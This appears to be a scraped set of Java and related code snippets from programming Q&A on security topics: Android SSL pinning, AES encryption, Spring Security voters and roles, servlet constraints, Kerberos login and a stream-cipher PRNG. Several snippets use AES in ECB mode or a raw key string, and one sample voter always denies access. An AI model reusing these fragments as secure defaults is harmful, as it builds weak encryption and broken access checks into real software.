            // if not successful issue another call for the next hour.
            AsyncResponse response = new AsyncResponse();
            response.jsonData = jsonObjectResult;
            response.opStatus = status;
            return response;
        }
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            if (listener != null)
                listener.getJsonStartProgress();
        }
        @Override
        protected void onProgressUpdate(Integer... progress) {
            listener.getJsonShowProgress(progress[0]);
        }
        @Override
        protected void onPostExecute(AsyncResponse result) {
            listener.getJsonFinished(result.jsonData, result.opStatus);
        }
        public  interface IGetJsonListener {
            void getJsonStartProgress();
            void getJsonShowProgress(int percent);
            void getJsonFinished(JsonObject resJson, APIStatus status);
        }
    }
    private static SSLContext getSSLContext(Context context){
        //Mostly taken from the Google code link in the question.
        try {
            CertificateFactory cf = CertificateFactory.getInstance("X.509");
            AssetManager am = context.getAssets();
            //THIS IS KEY: Your CA's cert stored in /assets/
            InputStream caInput = new BufferedInputStream(am.open("RootCA.crt"));
            Certificate ca;
            try {
                ca = cf.generateCertificate(caInput);
                //System.out.println("ca=" + ((X509Certificate) ca).getSubjectDN());
            } finally {
                caInput.close();
            }
            // Create a KeyStore containing our trusted CAs
            String keyStoreType = KeyStore.getDefaultType();
            KeyStore keyStore = KeyStore.getInstance(keyStoreType);
            keyStore.load(null, null);
            keyStore.setCertificateEntry("ca", ca);
            // Create a TrustManager that trusts the CAs in our KeyStore
            String tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();
            TrustManagerFactory tmf = TrustManagerFactory.getInstance(tmfAlgorithm);
            tmf.init(keyStore);
            // Create an SSLContext that uses our TrustManager
            SSLContext sslContext = SSLContext.getInstance("TLS");
            sslContext.init(null, tmf.getTrustManagers(), null);
            return sslContext;
        } catch (Exception e){
            return null;
        }
    }
    public enum APIStatus {
        OK("OK.", 200), //all went well
        JSON_ERROR("Error parsing response.", 1),
        NET_ERROR("Network error.", 2), //we couldn't reach the server
        UNKNOWN_ERROR("Unknown error.", 3), //some sh*t went down
        AUTH_ERROR("Authentication error.", 401), //credentials where wrong
        SERVER_ERROR("Internal server error.", 500), //server code crashed
        TIMEOUT("Operation timed out.", 408); //network too slow or server overloaded
        private String stringValue;
        private int intValue;
        private APIStatus(String toString, int value) {
            stringValue = toString;
            intValue = value;
        }
        @Override
        public String toString() {
            return stringValue;
        }
    }
    private static APIStatus getStatusFromCode(int code) {
        if (code==200 || code==201) {
            return APIStatus.OK;
        }else if (code == 401) {
            return APIStatus.AUTH_ERROR;
        } else if (code == 500) {
            return APIStatus.SERVER_ERROR;
        } else if (code == 408) {
            return APIStatus.TIMEOUT;
        } else {
            return APIStatus.UNKNOWN_ERROR;
        }
    }
    private static class AsyncResponse {
        public APIStatus opStatus;
        public JsonObject jsonData;
    }
    (...)
---UNIQUEIDFORSNIP---|207536263|    public class MyClass implements IGetJsonListener {
         (...)
         new GetJsonTask(context, this, "https://your.url.com/").execute();
         
         @Override
         public void getJsonFinished(JsonObject resJson, APIStatus status) {
            //Handle JSON content from web here
            (...)
         }
         (...)
    }
---UNIQUEIDFORSNIP---|207543212|    @RunAs("Employee")
    @WebServlet("/myServlet")
    @ServletSecurity(
      httpMethodConstraints = {
        @HttpMethodConstraint(value = "GET", rolesAllowed = "Manager"),
        @HttpMethodConstraint(value = "GET", rolesAllowed = "Employee") 
      }
    )
    public class MyServlet extends HttpServlet {
      // ...
    }
---UNIQUEIDFORSNIP---|207558340|    public static byte[] encryptWithAES(byte[] message, Key AESkey) throws Exception {
    byte[] decryptedMessage = null;
    try {
        Cipher encrypt = Cipher.getInstance("AES/ECB/PKCS5Padding"); // here is the change
        encrypt.init(Cipher.ENCRYPT_MODE, AESkey);
        decryptedMessage = encrypt.doFinal(message);
    } catch (Exception ex) {
        System.err.println(ex.getMessage());
        throw ex;
    }
    return decryptedMessage;
    }
---UNIQUEIDFORSNIP---|207558342|        public static byte[] encryptWithAES(byte[] message, Key AESkey, byte[] iv) throws Exception {
    byte[] decryptedMessage = null;
    try {
        Cipher encrypt = Cipher.getInstance("AES/CBC/PKCS5Padding");  // here is the change
        encrypt.init(Cipher.ENCRYPT_MODE, AESkey,new IvParameterSpec(iv)); // and I add the iv for cbc
        decryptedMessage = encrypt.doFinal(message);
    } catch (Exception ex) {
        System.err.println(ex.getMessage());
        throw ex;
    }
    return decryptedMessage;
    }
---UNIQUEIDFORSNIP---|207558344|    - (NSData *) AESECB : (NSData *) data withKey :(NSData *) key : (CCOperation) operation{
    
    CCCryptorStatus ccStatus = kCCSuccess;
    NSUInteger dataLength = data.length;
    size_t bufferSize = dataLength + kCCBlockSizeAES128;
    void *buffer = malloc( bufferSize );
    
    size_t numBytes = 0;
    
    ccStatus = CCCrypt(operation,  // will pass kCCDecrypt or kCCEncrypt
                       kCCAlgorithmAES,
                       kCCOptionECBMode | kCCOptionPKCS7Padding,
                       [key bytes],
                       [key length],
                       nil,
                       [data bytes],
                       [data length],
                       buffer,
                       bufferSize,
                       &numBytes);
    
    if( ccStatus == kCCSuccess )
    {
        return [NSData dataWithBytes:buffer length:numBytes];
    }
    
    free(buffer);
    return nil;
    }
    - (NSData *) AESCBC : (NSData *) data withKey: (NSData *) key : (CCOperation) operation{
    CCCryptorStatus ccStatus = kCCSuccess;
    NSUInteger dataLength = data.length;
    size_t bufferSize = dataLength + kCCBlockSizeAES128;
    void *buffer = malloc( bufferSize );
    
    size_t numBytes = 0;
    
    ccStatus = CCCrypt(operation,  // will pass kCCDecrypt or kCCEncrypt
                       kCCAlgorithmAES,
                       kCCOptionPKCS7Padding,
                       [key bytes],
                       [key length],
                       self.IV.bytes,
                       [data bytes],
                       [data length],
                       buffer,
                       bufferSize,
                       &numBytes);
    
    if( ccStatus == kCCSuccess )
    {
        return [NSData dataWithBytes:buffer length:numBytes];
    }
    
    free(buffer);
    return nil;
    }
---UNIQUEIDFORSNIP---|207752295|			Element element = doc.getElementById("122"); // null
			//System.out.println(element.getNodeValue());
			NodeList e = doc.getElementsByTagName("myxml");
			NamedNodeMap namedNodeMap = e.item(0).getAttributes();
			String value = namedNodeMap.getNamedItem("id").getNodeValue();
			System.out.println(value); // 122
---UNIQUEIDFORSNIP---|207759350|    @Repository
    public interface UserSocialRepository extends JpaRepository<SocialUser, Long> {
      @Query("SELECT u FROM Users u WHERE u.username = ?1")
      SocialUser findByUsername(String username);
    }
---UNIQUEIDFORSNIP---|207759353|    SocialUser findByUsername(String username);
---UNIQUEIDFORSNIP---|207759357|    @Entity
    @Table(name = "users")
    public class Users {
        private String username;
        // ...
    }
---UNIQUEIDFORSNIP---|207759359|    Users findByUsername(String username);
---UNIQUEIDFORSNIP---|207759361|    public UserDetails findByUsername(String username) {
        Users user = userSocialRepository.findByUsername(username);
        return new SocialUser(user.getUsername(), ...);
    }
---UNIQUEIDFORSNIP---|208028919|    /usr/local/java/jdk6/bin/java -server 
    -Duser.timezone=America/Sao_Paulo -XX:MaxPermSize=128m -Xms30m -Xmx1024m 
    -Djava.endorsed.dirs=/var/tomcat/7.0/endorsed 
    -classpath :/var/tomcat/7.0/bin/bootstrap.jar 
    -Djava.security.manager 
    -Djava.security.policy==/var/tomcat/7.0/conf/catalina.policy 
    -Dcatalina.base=/var/tomcat/7.0 -Dcatalina.home=/var/tomcat/7.0 
    -Djava.security.debug=all
    -Djava.io.tmpdir=tmpdir org.apache.catalina.startup.Bootstrap 
    -config dir/to/xml.conf start
---UNIQUEIDFORSNIP---|208110621|    SELECT `passwordHash`, `Salt` FROM `--database--` WHERE `username`= ?;
---UNIQUEIDFORSNIP---|208110626|    SELECT `passwordHash`, 
           `Salt`, 
LockoutStatus
    FROM   `--database--` 
    WHERE  `username`= ?;
---UNIQUEIDFORSNIP---|208207674|    public String getValid( String context, String input ) throws ValidationException
    	{
    		String data = null;
    
    		// checks on input itself
    
    		// check for empty/null
    		if(checkEmpty(context, input) == null)
    			return null;
    
    		if (validateInputAndCanonical)
    		{
    			//first validate pre-canonicalized data
    			
    			// check length
    			checkLength(context, input);
    
    			// check whitelist patterns
    			checkWhitelist(context, input);
    
    			// check blacklist patterns
    			checkBlacklist(context, input);
    			
    			// canonicalize
    			data = encoder.canonicalize( input );
    			
    		} else {
    			
    			//skip canonicalization
    			data = input;			
    		}
    
    		// check for empty/null
    		if(checkEmpty(context, data, input) == null)
    			return null;
    
    		// check length
    		checkLength(context, data, input);
    
    		// check whitelist patterns
    		checkWhitelist(context, data, input);
    
    		// check blacklist patterns
    		checkBlacklist(context, data, input);
    
    		// validation passed
    		return data;
---UNIQUEIDFORSNIP---|208517448|    Indicates whether this AccessDecisionVoter is able to vote on the 
    passed ConfigAttribute.
---UNIQUEIDFORSNIP---|208517450|    <security:http auto-config="true" use-expressions="true">
            <security:intercept-url pattern="/login*"
                access="isAnonymous()" />
    </security:http>
---UNIQUEIDFORSNIP---|208517453|    <security:http auto-config="true" use-expressions="true">
            <security:intercept-url pattern="/admin/**"
                access="ROLE_ADMIN" />
    </security:http>
---UNIQUEIDFORSNIP---|208517457|    public void More ...decide(Authentication authentication, Object object, Collection<ConfigAttribute> configAttributes)
    46            throws AccessDeniedException {
    47        int deny = 0;
    48
    49        for (AccessDecisionVoter voter : getDecisionVoters()) {
    50            int result = voter.vote(authentication, object, configAttributes);
    51
    52            if (logger.isDebugEnabled()) {
    53                logger.debug("Voter: " + voter + ", returned: " + result);
    54            }
    55
    56            switch (result) {
    57            case AccessDecisionVoter.ACCESS_GRANTED:
    58                return;
    59
    60            case AccessDecisionVoter.ACCESS_DENIED:
    61                deny++;
    62
    63                break;
    64
    65            default:
    66                break;
    67            }
    68        }
    69
    70        if (deny > 0) {
    71            throw new AccessDeniedException(messages.getMessage("AbstractAccessDecisionManager.accessDenied",
    72                    "Access is denied"));
    73        }
    74
    75        // To get this far, every AccessDecisionVoter abstained
    76        checkAllowIfAllAbstainDecisions();
    77    }
---UNIQUEIDFORSNIP---|208517461|    @Service
    public class MyVoter implements AccessDecisionVoter<Entity> {
    
        @Override
        public boolean supports(ConfigAttribute attribute) {        
            boolean myBool = false;
            return myBool;
        }
    
        @Override
        public boolean supports(Class<?> clazz) {
            return clazz == Project.class;
        }
    
        @Override
        public int vote(Authentication authentication, Entity someEntity,
                Collection<ConfigAttribute> config) {
            if(supports(config)) { // Add this check
                return ACCESS_GRANTED;
            } else {
                return ACCESS_DENIED; // Abstain Based on your requirement
            }
        }
    }
---UNIQUEIDFORSNIP---|208846123|roleHierarchy.setHierarchy("ROLE_ADMIN > ROLE_USER > ROLE_DEFAULT");
I don't remember why I wrote the hierarchy like that but it's not correct. The [API for that method][1] handles the same situation thusly:
> **Role hierarchy:** ROLE_A > ROLE_B and ROLE_B > ROLE_C.<br>
> **Directly assigned authority:** ROLE_A.<br>
> **Reachable authorities:** ROLE_A, ROLE_B, ROLE_C.
  Eventually it became clear that a hierarchical model didn't fit our roles so we instead implemented a finer-grained set of authorities mapped to roles, as mentioned in the [Spring Security Reference][2]:
>For more complex requirements you may wish to define a logical mapping between the specific access-rights your application requires and the roles that are assigned to users, translating between the two when loading the user information. 
  [1]: http://docs.spring.io/spring-security/site/docs/4.0.0.RELEASE/apidocs/org/springframework/security/access/hierarchicalroles/RoleHierarchyImpl.html#setHierarchy%28java.lang.String%29
  [2]: https://docs.spring.io/spring-security/site/docs/current/reference/htmlsingle/#authz-hierarchical-roles
---UNIQUEIDFORSNIP---|209026195|    public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
        protected void configure(HttpSecurity http) {
            http.requiresChannel().anyRequest().requiresSecure();
        }
    }
---UNIQUEIDFORSNIP---|209534873|    import javax.crypto.Cipher;
    import javax.crypto.spec.SecretKeySpec;
    import org.apache.commons.codec.binary.Base64;
    public static String encrypt(String text) throws Exception
	{
		SecretKeySpec sksSpec = new SecretKeySpec(key.getBytes(), algo );
		Cipher cipher = Cipher.getInstance(algo);
		cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, sksSpec);
		
		byte[] encrypt_bytes = cipher.doFinal(text.getBytes());
		return new String( Base64.encodeBase64(encrypt_bytes) );
	}
	
	public static String decrypt(String encrypt_str) throws Exception
	{
		SecretKeySpec sksSpec = new SecretKeySpec(key.getBytes(), algo);
		Cipher cipher = Cipher.getInstance(algo);
		cipher.init(Cipher.DECRYPT_MODE, sksSpec);
		
		return new String(cipher.doFinal( Base64.decodeBase64(encrypt_str.getBytes("UTF-8"))));
	}
---UNIQUEIDFORSNIP---|209732923|    config.set("hbase.zookeeper.quorum", zookeeperHosts);
	config.set("hbase.zookeeper.property.clientPort", zookeeperPort);
	config.set("hadoop.security.authentication", "kerberos");
	config.set("hbase.security.authentication", "kerberos");
	config.set("hbase.master.kerberos.principal", HBASE_MASTER_PRINCIPAL);
	config.set("hbase.regionserver.kerberos.principal", HBASE_RS_PRINCIPAL);
			
	UserGroupInformation.setConfiguration(config);
	UserGroupInformation.loginUserFromKeytab(ZOOKEEPER_PRINCIPAL,ZOOKEEPER_KEYTAB);
			
	HBaseAdmin admins = new HBaseAdmin(config);
	TableName[] tables  = admins.listTableNames();
			
	for(TableName table: tables){
		System.out.println(table.toString());
	}
---UNIQUEIDFORSNIP---|209792419|    <security-constraint>
        <web-resource-collection>
            <url-pattern>#Some URL PATTERN#</url-pattern>
        </web-resource-collection>
        <auth-constraint>
            <security-role-name>CalendarUser</security-role-name>
        </auth-constraint>
    </security-constraint>
---UNIQUEIDFORSNIP---|209792423|    String username = request.getRemoteUser();
---UNIQUEIDFORSNIP---|210175037|    @RepositoryRestResource(exported = false)
    @Component("UserRepository")
    public interface UserRepository extends CrudRepository<User, Long> { }
---UNIQUEIDFORSNIP---|210175039|    @Component("UserRepositoryRest")
    @Primary
    @RepositoryRestResource(collectionResourceRel = "users", path = "users", exported = true)
    public interface UserRepositoryRest extends UserRepository {
    
        @PostAuthorize(" principal.getUsername() == returnObject.getUsername() || hasRole('ROLE_ADMIN') ")
        @Override
        User findOne(Long id);
    }
---UNIQUEIDFORSNIP---|210175041|    import org.springframework.beans.factory.BeanFactory;
    import org.springframework.beans.factory.BeanFactoryUtils;
    import org.springframework.beans.factory.ListableBeanFactory;
    import org.springframework.beans.factory.support.DefaultListableBeanFactory;
    import org.springframework.data.mapping.PersistentEntity;
    import org.springframework.data.repository.core.EntityInformation;
    import org.springframework.data.repository.core.RepositoryInformation;
    import org.springframework.data.repository.core.support.RepositoryFactoryInformation;
    import org.springframework.data.repository.query.QueryMethod;
    import org.springframework.data.repository.support.Repositories;
    import org.springframework.data.rest.core.annotation.RepositoryRestResource;
    import org.springframework.util.Assert;
    import org.springframework.util.ClassUtils;
    
    import java.io.Serializable;
    import java.util.*;
    
    /**
     * @author Will Faithfull
     *
     * Warning: Ugly hack territory.
     *
     * Firstly, I can't just swap out this implementation, because Repositories is referenced everywhere directly without an
     * interface.
     *
     * Unfortunately, the offending code is in a private method, {@link #cacheRepositoryFactory(String)}, and modifies private
     * fields in the Repositories class. This means we can either use reflection, or replicate the functionality of the class.
     *
     * In this instance, I've chosen to do the latter because it's simpler, and most of this code is a simple copy/paste from
     * Repositories. The superclass is given an empty bean factory to satisfy it's constructor demands, and ensure that
     * it will keep as little redundant state as possible.
     */
    public class ExportAwareRepositories extends Repositories {
    
        static final Repositories NONE = new ExportAwareRepositories();
    
        private static final RepositoryFactoryInformation<Object, Serializable> EMPTY_REPOSITORY_FACTORY_INFO = EmptyRepositoryFactoryInformation.INSTANCE;
        private static final String DOMAIN_TYPE_MUST_NOT_BE_NULL = "Domain type must not be null!";
    
        private final BeanFactory beanFactory;
        private final Map<Class<?>, String> repositoryBeanNames;
        private final Map<Class<?>, RepositoryFactoryInformation<Object, Serializable>> repositoryFactoryInfos;
    
        /**
         * Constructor to create the {@link #NONE} instance.
         */
        private ExportAwareRepositories() {
            /* Mug off the superclass with an empty beanfactory to placate the Assert.notNull */
            super(new DefaultListableBeanFactory());
            this.beanFactory = null;
            this.repositoryBeanNames = Collections.<Class<?>, String> emptyMap();
            this.repositoryFactoryInfos = Collections.<Class<?>, RepositoryFactoryInformation<Object, Serializable>> emptyMap();
        }
    
        /**
         * Creates a new {@link Repositories} instance by looking up the repository instances and meta information from the
         * given {@link ListableBeanFactory}.
         *
         * @param factory must not be {@literal null}.
         */
        public ExportAwareRepositories(ListableBeanFactory factory) {
            /* Mug off the superclass with an empty beanfactory to placate the Assert.notNull */
            super(new DefaultListableBeanFactory());
            Assert.notNull(factory, "Factory must not be null!");
    
            this.beanFactory = factory;
            this.repositoryFactoryInfos = new HashMap<Class<?>, RepositoryFactoryInformation<Object, Serializable>>();
            this.repositoryBeanNames = new HashMap<Class<?>, String>();
    
            populateRepositoryFactoryInformation(factory);
        }
    
        private void populateRepositoryFactoryInformation(ListableBeanFactory factory) {
    
            for (String name : BeanFactoryUtils.beanNamesForTypeIncludingAncestors(factory, RepositoryFactoryInformation.class,
                    false, false)) {
                cacheRepositoryFactory(name);
            }
        }
    
        @SuppressWarnings({ "rawtypes", "unchecked" })
        private synchronized void cacheRepositoryFactory(String name) {
    
            RepositoryFactoryInformation repositoryFactoryInformation = beanFactory.getBean(name,
                    RepositoryFactoryInformation.class);
            Class<?> domainType = ClassUtils
                    .getUserClass(repositoryFactoryInformation.getRepositoryInformation().getDomainType());
    
            RepositoryInformation information = repositoryFactoryInformation.getRepositoryInformation();
            Set<Class<?>> alternativeDomainTypes = information.getAlternativeDomainTypes();
            String beanName = BeanFactoryUtils.transformedBeanName(name);
    
            Set<Class<?>> typesToRegister = new HashSet<Class<?>>(alternativeDomainTypes.size() + 1);
            typesToRegister.add(domainType);
            typesToRegister.addAll(alternativeDomainTypes);
    
            for (Class<?> type : typesToRegister) {
                // I still want to add repositories if they don't have an exported counterpart, so we eagerly add repositories
                // but then check whether to supercede them. If you have more than one repository with exported=true, clearly
                // the last one that arrives here will be the registered one. I don't know why anyone would do this though.
                if(this.repositoryFactoryInfos.containsKey(type)) {
                    Class<?> repoInterface = information.getRepositoryInterface();
                    if(repoInterface.isAnnotationPresent(RepositoryRestResource.class)) {
                        boolean exported = repoInterface.getAnnotation(RepositoryRestResource.class).exported();
    
                        if(exported) { // Then this has priority.
                            this.repositoryFactoryInfos.put(type, repositoryFactoryInformation);
                            this.repositoryBeanNames.put(type, beanName);
                        }
                    }
                } else {
                    this.repositoryFactoryInfos.put(type, repositoryFactoryInformation);
                    this.repositoryBeanNames.put(type, beanName);
                }
            }
        }
    
        /**
         * Returns whether we have a repository instance registered to manage instances of the given domain class.
         *
         * @param domainClass must not be {@literal null}.
         * @return
         */
        @Override
        public boolean hasRepositoryFor(Class<?> domainClass) {
    
            Assert.notNull(domainClass, DOMAIN_TYPE_MUST_NOT_BE_NULL);
    
            return repositoryFactoryInfos.containsKey(domainClass);
        }
    
        /**
         * Returns the repository managing the given domain class.
         *
         * @param domainClass must not be {@literal null}.
         * @return
         */
        @Override
        public Object getRepositoryFor(Class<?> domainClass) {
    
            Assert.notNull(domainClass, DOMAIN_TYPE_MUST_NOT_BE_NULL);
    
            String repositoryBeanName = repositoryBeanNames.get(domainClass);
            return repositoryBeanName == null || beanFactory == null ? null : beanFactory.getBean(repositoryBeanName);
        }
    
        /**
         * Returns the {@link RepositoryFactoryInformation} for the given domain class. The given <code>code</code> is
         * converted to the actual user class if necessary, @see ClassUtils#getUserClass.
         *
         * @param domainClass must not be {@literal null}.
         * @return the {@link RepositoryFactoryInformation} for the given domain class or {@literal null} if no repository
         *         registered for this domain class.
         */
        private RepositoryFactoryInformation<Object, Serializable> getRepositoryFactoryInfoFor(Class<?> domainClass) {
    
            Assert.notNull(domainClass, DOMAIN_TYPE_MUST_NOT_BE_NULL);
    
            Class<?> userType = ClassUtils.getUserClass(domainClass);
            RepositoryFactoryInformation<Object, Serializable> repositoryInfo = repositoryFactoryInfos.get(userType);
    
            if (repositoryInfo != null) {
                return repositoryInfo;
            }
    
            if (!userType.equals(Object.class)) {
                return getRepositoryFactoryInfoFor(userType.getSuperclass());
            }
    
            return EMPTY_REPOSITORY_FACTORY_INFO;
        }
    
        /**
         * Returns the {@link EntityInformation} for the given domain class.
         *
         * @param domainClass must not be {@literal null}.
         * @return
         */
        @SuppressWarnings("unchecked")
        @Override
        public <T, S extends Serializable> EntityInformation<T, S> getEntityInformationFor(Class<?> domainClass) {
    
            Assert.notNull(domainClass, DOMAIN_TYPE_MUST_NOT_BE_NULL);
    
            return (EntityInformation<T, S>) getRepositoryFactoryInfoFor(domainClass).getEntityInformation();
        }
    
        /**
         * Returns the {@link RepositoryInformation} for the given domain class.
         *
         * @param domainClass must not be {@literal null}.
         * @return the {@link RepositoryInformation} for the given domain class or {@literal null} if no repository registered
         *         for this domain class.
         */
        @Override
        public RepositoryInformation getRepositoryInformationFor(Class<?> domainClass) {
    
            Assert.notNull(domainClass, DOMAIN_TYPE_MUST_NOT_BE_NULL);
    
            RepositoryFactoryInformation<Object, Serializable> information = getRepositoryFactoryInfoFor(domainClass);
            return information == EMPTY_REPOSITORY_FACTORY_INFO ? null : information.getRepositoryInformation();
        }
    
        /**
         * Returns the {@link RepositoryInformation} for the given repository interface.
         *
         * @param repositoryInterface must not be {@literal null}.
         * @return the {@link RepositoryInformation} for the given repository interface or {@literal null} there's no
         *         repository instance registered for the given interface.
         * @since 1.12
         */
        @Override
        public RepositoryInformation getRepositoryInformation(Class<?> repositoryInterface) {
    
            for (RepositoryFactoryInformation<Object, Serializable> factoryInformation : repositoryFactoryInfos.values()) {
    
                RepositoryInformation information = factoryInformation.getRepositoryInformation();
    
                if (information.getRepositoryInterface().equals(repositoryInterface)) {
                    return information;
                }
            }
    
            return null;
        }
    
        /**
         * Returns the {@link PersistentEntity} for the given domain class. Might return {@literal null} in case the module
         * storing the given domain class does not support the mapping subsystem.
         *
         * @param domainClass must not be {@literal null}.
         * @return the {@link PersistentEntity} for the given domain class or {@literal null} if no repository is registered
         *         for the domain class or the repository is not backed by a {@link MappingContext} implementation.
         */
        @Override
        public PersistentEntity<?, ?> getPersistentEntity(Class<?> domainClass) {
    
            Assert.notNull(domainClass, DOMAIN_TYPE_MUST_NOT_BE_NULL);
            return getRepositoryFactoryInfoFor(domainClass).getPersistentEntity();
        }
    
        /**
         * Returns the {@link QueryMethod}s contained in the repository managing the given domain class.
         *
         * @param domainClass must not be {@literal null}.
         * @return
         */
        @Override
        public List<QueryMethod> getQueryMethodsFor(Class<?> domainClass) {
    
            Assert.notNull(domainClass, DOMAIN_TYPE_MUST_NOT_BE_NULL);
            return getRepositoryFactoryInfoFor(domainClass).getQueryMethods();
        }
    
        /*
         * (non-Javadoc)
         * @see java.lang.Iterable#iterator()
         */
        @Override
        public Iterator<Class<?>> iterator() {
            return repositoryFactoryInfos.keySet().iterator();
        }
    
        /**
         * Null-object to avoid nasty {@literal null} checks in cache lookups.
         *
         * @author Thomas Darimont
         */
        private static enum EmptyRepositoryFactoryInformation implements RepositoryFactoryInformation<Object, Serializable> {
    
            INSTANCE;
    
            @Override
            public EntityInformation<Object, Serializable> getEntityInformation() {
                return null;
            }
    
            @Override
            public RepositoryInformation getRepositoryInformation() {
                return null;
            }
    
            @Override
            public PersistentEntity<?, ?> getPersistentEntity() {
                return null;
            }
    
            @Override
            public List<QueryMethod> getQueryMethods() {
                return Collections.<QueryMethod> emptyList();
            }
        }
    }
---UNIQUEIDFORSNIP---|210175043|    import me.faithfull.hack.ExportAwareRepositories;
    import org.springframework.beans.factory.annotation.Autowired;
    import org.springframework.context.ApplicationContext;
    import org.springframework.context.annotation.Configuration;
    import org.springframework.data.repository.support.Repositories;
    import org.springframework.data.rest.webmvc.config.RepositoryRestMvcConfiguration;
    
    /**
     * @author Will Faithfull
     */
    @Configuration
    public class RepositoryRestConfiguration extends RepositoryRestMvcConfiguration {
    
        @Autowired
        ApplicationContext context;
    
        /**
         * We replace the stock repostiories with our modified subclass.
         */
        @Override
        public Repositories repositories() {
            return new ExportAwareRepositories(context);
        }
    }
---UNIQUEIDFORSNIP---|210535756|    <ns:binding-type xsi:type="ns:by-name-bean" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
        <ns:xmlcomponent>t=custom-ldapdb-bean-apType@your.namespaces</ns:xmlcomponent>
        <ns:javatype>fr.telecom.devices.ws.security.iap.MyAuthenticationMBeanImpl</ns:javatype>
---UNIQUEIDFORSNIP---|210535758|	.
	├── commo.dtd
	├── MyAuthentication-Mbean.xml
	├── fr
	│   └── telecom
	│       └── devices
	│           └── ws
	│               └── security
	│                   └── iap
	│                       ├── impl
	│                       │   ├── MyAuthenticationProviderImpl.class
	│                       │   ├── ...
	│                       │   └── ...
	│                       └── mbeans
	│                           ├── MyAuthenticationImpl.class
	│                           ├── MyAuthenticationMBean.class
	│                           ├── MyAuthenticationImplBeanInfo.class
	│                           ├── MyAuthenticationMBeanImpl.class
	│                           ├── MyAuthentication$Helper.class
	│                           └── MyAuthentication$SchemaHelper2.class
	├── META-INF
	│   ├── beaninfofactory.txt
	│   ├── binding-file.ser
	│   ├── binding-file.xml
	│   ├── binding-mapping-file.ser
	│   ├── MANIFEST.MF
	│   └── schemas
	│       └── schema-0.xsd
	├── schemacom_bea_xml
	│   ├── element
	│   │   └── your_2Enamespace
	│   │       └── my_2Dauthentication_2Dap.xsb
	│   ├── namespace
	│   │   └── your_2Enamespace
	│   │       └── xmlns.xsb
	│   ├── system
	│   │   └── sED25F267F5545F2AED6F8F098FF3212F
	│   │       ├── myauthentication94aadoctype.xsb
	│   │       ├── myauthentication.xsb
	│   │       ├── myauthentication7480type.xsb
	│   │       ├── index.xsb
	│   │       └── TypeSystemHolder.class
	│   └── type
	│       └── es_2Esescam_2Eprovider
	│           └── my_2Dauthentication2DapType.xsb
	└── weblogic
		  ├── descriptor
		  │   └── SettableBean.class
		  └── management
		      └── security
		          └── LDAP_DB_WLS12C_PROVIDER18595502884856BeanInfoFactory.class
---UNIQUEIDFORSNIP---|210535760|    java 
      -DMJF=C:\...\...\WLAuthenticationProvider\jar\WSAuthentication.jar \
      -Dfiles=C:\...\...\WLAuthenticationProvider\src \ 
      -DtargetNameSpace= your.own.namespace \
      weblogic.management.commo.WebLogicMBeanMaker
---UNIQUEIDFORSNIP---|210866840|    <security-constraint>
        <web-resource-collection>
            <web-resource-name>Basic Authorization</web-resource-name>
            <description/>
            <url-pattern>/resources/*</url-pattern>
        </web-resource-collection>
        <auth-constraint>
            <role-name>SECRET</role-name>
        </auth-constraint>
    </security-constraint>
---UNIQUEIDFORSNIP---|210910666|    class CSRFRequestMatcher implements RequestMatcher{
        public boolean matches (HttpServletRequest req){
            //Check if request contains valid header name & header value
        }
    }
---UNIQUEIDFORSNIP---|210921863|    SecurityUtils.getSubject().login(new DemoToken(profile));
---UNIQUEIDFORSNIP---|211066962|    <listener>
      <listener-class>
        org.springframework.security.web.session.HttpSessionEventPublisher
      </listener-class>
    </listener>
---UNIQUEIDFORSNIP---|211066964|    <http>
      ...
      <session-management>
          <concurrency-control max-sessions="1" />
      </session-management>
    </http>
        
---UNIQUEIDFORSNIP---|211066968|    <http>
      ...
      <session-management>
          <concurrency-control max-sessions="1" error-if-maximum-exceeded="true" />
      </session-management>
    </http>
        
---UNIQUEIDFORSNIP---|211070032|    new SecureRandom(seed);
---UNIQUEIDFORSNIP---|211070034|    package nl.owlstead.stackoverflow;
    
    import java.nio.ByteBuffer;
    import java.util.Random;
    
    import javax.crypto.Cipher;
    import javax.crypto.SecretKey;
    import javax.crypto.ShortBufferException;
    import javax.crypto.spec.IvParameterSpec;
    import javax.crypto.spec.SecretKeySpec;
    
    /**
     * A well-defined pseudo-random generator that is based on a stream cipher.
     * <p>
     * This class mimics the {@link Random} class method signatures; it however does currently not provide:
     * <ul>
     * <li>operations returning floats or doubles including returning a Gaussian value in the range [0, 1.0) </li>
     * <li>streams of integers or longs</li>
     * </ul>
     * due to laziness of the developer.
     * It does not allow for re-seeding as re-seeding is not defined for a stream cipher;
     * the same goes from retrieving a seed from the underlying entropy source as it hasn't got one.
     * <p>
     * It is assumed that most significant (leftmost) bytes are taken from the stream cipher first.
     * All the algorithms used to return the random values are well defined, so that compatible implementations can be generated.
     * <p>
     * Instances of this class are stateful and not thread safe.
     * 
     * @author Maarten Bodewes
     */
    public class StreamCipherPseudoRandom {
        
        private static final long TWO_POW_48 = 1L << 48;
        
        private final Cipher streamCipher;
        
        // must be a buffer of at least 6 bytes
        // a buffer that is x times 16 is probably most efficient for AES/CTR mode encryption within getBytes(byte[])
        private final ByteBuffer zeros = ByteBuffer.allocate(64);
        
        /**
         * Creates a SecureRandom from a stream cipher.
         * 
         * @param streamCipher an initialized stream cipher
         * @throws NullPointerException if the cipher is <code>null</code>
         * @throws IllegalStateException if the cipher is not initialized
         * @throws IllegalArgumentException if the cipher is not a stream cipher
         */
        public StreamCipherPseudoRandom(final Cipher streamCipher) {
            if (streamCipher.getOutputSize(1) != 1) {
                throw new IllegalArgumentException("Not a stream cipher");
            }
            this.streamCipher = streamCipher;
        }
        
        /**
         * Generates a pseudo-random number of bytes by taking exactly the required number of bytes from the stream cipher.
         * 
         * @param data the buffer to be randomized
         */
        public void nextBytes(final byte[] data) {
            generateRandomInBuffer(ByteBuffer.wrap(data));
        }
    
        /**
         * Generates a pseudo-random boolean value by taking exactly 1 byte from the stream cipher,
         * returning true if and only if the returned value is odd (i.e. if the least significant bit is set to 1), false otherwise.
         * 
         * @return the random boolean
         */
        public boolean nextBoolean() {
            return (generateRandomInBuffer(ByteBuffer.allocate(Byte.BYTES)).get() & 1) == 1;
        }
    
        /**
         * Generates a pseudo-random <code>int</code> value by taking exactly 4 bytes from the stream cipher.
         * 
         * @return the random <code>int</code> value
         */
        public int nextInt() {
            return generateRandomInBuffer(ByteBuffer.allocate(Integer.BYTES)).getInt();
        }
    
        /**
